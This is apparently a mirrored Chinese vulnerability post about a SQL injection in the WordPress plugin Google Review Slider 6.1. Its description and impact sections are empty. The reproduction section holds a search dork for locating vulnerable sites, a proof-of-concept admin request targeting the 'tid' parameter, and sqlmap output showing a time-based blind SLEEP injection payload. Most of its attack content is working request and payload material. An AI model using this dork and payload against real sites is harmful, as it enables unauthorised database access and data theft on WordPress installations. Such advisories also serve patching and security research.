# WordPress Plugin - Google Review Slider 6.1 SQL Injection

> 原文：[https://www.zhihuifly.com/t/topic/3240](https://www.zhihuifly.com/t/topic/3240)

# WordPress Plugin - Google Review Slider 6.1 SQL Injection

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

inurl:"/wp-content/plugins/wp-google-places-review-slider/"

POC :

```
 GET/wp-admin/admin.php?page=wp_google-templates_posts&tid=1&_wpnonce=***
 &taction=edit HTTP/1.1 
```

sqlmap result

```
sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
---
Parameter: tid (GET)
Type: time-based blind
title: "MySQL >= 5.0.12 AND time-based blind (query SLEEP)"
Payload: page=wp_google-templates_posts&tid=1 AND (SELECT 5357 FROM
(SELECT(SLEEP(5)))kHQz)&_wpnonce=***&taction=edit 
```